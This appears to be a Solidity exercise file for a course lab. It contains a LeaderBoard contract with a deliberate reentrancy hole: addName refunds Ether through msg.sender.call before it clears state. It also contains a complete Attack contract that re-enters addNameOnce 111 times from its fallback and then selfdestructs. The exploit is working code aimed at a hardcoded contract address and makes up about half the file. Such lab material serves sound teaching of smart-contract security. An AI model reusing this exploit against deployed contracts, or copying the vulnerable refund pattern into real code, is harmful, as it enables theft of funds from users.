pragma solidity ^0.6.0;

// Updated LeaderBoard for Lab 3
contract LeaderBoard {
    
    
    mapping (address => bool) private status; //true if this is there first time to call add name
    mapping (address => uint) private numberOfNamesOnBoard;
    mapping (address => bool) private inAddProcess;
    mapping (address => address) private studentAliases;
    
    
     /*
    * initialize(): allows to start and reset their status on the board. Called first.
    * @arg studentAlias - the main address that the student mainly uses.
    * @returns nothing
    */
    function initialize(address studentAlias) public{
        studentAliases[studentAlias] = msg.sender; // Alias(know) -> newAddress(unknown) Needed to view LeaderBoard
        status[msg.sender] = true;
        numberOfNamesOnBoard[msg.sender] = 0;
    }

    /*
    * getLeaderboardEntryByAlias(): allows anyone to get the value of a address by the known alias address.
    * @arg studentAlias - the main address that the student mainly uses.
    * @returns uint - the number of times your name is on the board.
    */
    function getLeaderboardEntryByAlias(address studentsAlias) view public returns(uint){
        return numberOfNamesOnBoard[studentAliases[studentsAlias]];
    }

    /*
    * getLeaderboardEntryByCaller(): allows anyone to get the value of a address by the unknown address.
    * @arg studentAlias - the unknown address that the student used to call the function.
    * @returns uint - the number of times your name is on the board.
    */
    function getLeaderboardEntryByCaller(address caller) view public returns(uint){
        return numberOfNamesOnBoard[caller];
    }
    
    /*
    * addNameOnce(): will add the students name to the board if the it is in the process.
    * @arg sentValueCheck - the value that that it needs to check that the caller sent to verify it is at least sentValueCheck.
    * @returns nothing
    */
    function addNameOnce(uint sentValueCheck) public payable{ 
        require(inAddProcess[msg.sender],"Must have started the process - addNameOnce"); //Must have started the proccess.
        require(status[msg.sender],"Must be first - addNameOnce"); //Must be first
        require(msg.value >= sentValueCheck && msg.value > 0,"Must pay a positive amount of eth - addNameOnce"); // Must pay positive amount of ether
        
        numberOfNamesOnBoard[msg.sender] += 1; //Adds your item one time
    }
    
    /*
    * addName(): will start the process to add the students name to the board.
    * @arg key - the secret key that needs to be submitted to call the addName function.
    * @returns nothing
    */
    function addName(uint key) public payable{ // make the students to pay us for the to play.
        require(status[msg.sender],"Must be first time - addName"); //Must be first time
        require(key == 1337);
        require(msg.value >= 1 ether, "Insufficient eth - addName");
        inAddProcess[msg.sender] = true;
        (bool isSuccessfulTransfer,) = msg.sender.call.value(msg.value)(""); //repay back.
        require(isSuccessfulTransfer,"Unsuccessful transfer - addName");
        addNameOnce(1 ether);
        inAddProcess[msg.sender] = false;
        status[msg.sender] = false;
    }


}

contract Attack {
    address LB_ADDR = 0xd9145CCE52D386f254917e481eB44e9943F39138;
    address payable MY_ADDRESS = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    
    LeaderBoard board = LeaderBoard(LB_ADDR);
    constructor() public {
        board.initialize(MY_ADDRESS);
    }
    
    function startAttack() public payable{
        board.addName{value:1 ether}(1337);
    }
    
    fallback() external payable {
        
        for (int i = 0; i < 111; i++) {
            board.addNameOnce{value: 1 wei}(1 wei);    
        }
        
        selfdestruct(MY_ADDRESS);
    }
    
    /*
    * fund(): allows the additional funding of the smart contract easily. Anyone can call it.
    * @arg nothing
    * @returns nothing
    */
    function fund() public payable{ // allows admin to give some funds into the smart contract to cover the gas cost ~1 ether is good.
    }
}
